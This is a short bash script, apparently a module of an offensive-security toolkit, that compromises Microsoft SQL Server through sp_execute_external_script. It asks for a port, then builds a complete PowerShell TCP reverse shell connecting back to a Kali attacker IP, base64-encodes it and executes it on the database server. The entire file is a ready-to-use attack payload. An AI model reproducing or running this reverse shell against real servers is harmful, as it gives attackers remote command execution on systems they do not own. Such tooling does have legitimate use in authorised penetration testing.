#!/bin/bash

: '
execute sp_execute_external_script powershell reverse shell
'

source "${SCRIPTS_DIR}/sqlDatabase/mssql/.files/sp_execute_external_script.sh"

# Generate GUI form items (label, type (optional: default text), name, default (optional))
PORT_FIELD=$(form_item "PORT" "port")

# Generate GUI form
generate_form "${PORT_FIELD}"

PORT=${form_data["port"]}

REV_SHELL=$(echo "\$client = New-Object System.Net.Sockets.TCPClient(\"${KALI_IP}\",${PORT});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()" | base64 -w 0)

execute_external_script "powershell -e ${REV_SHELL}"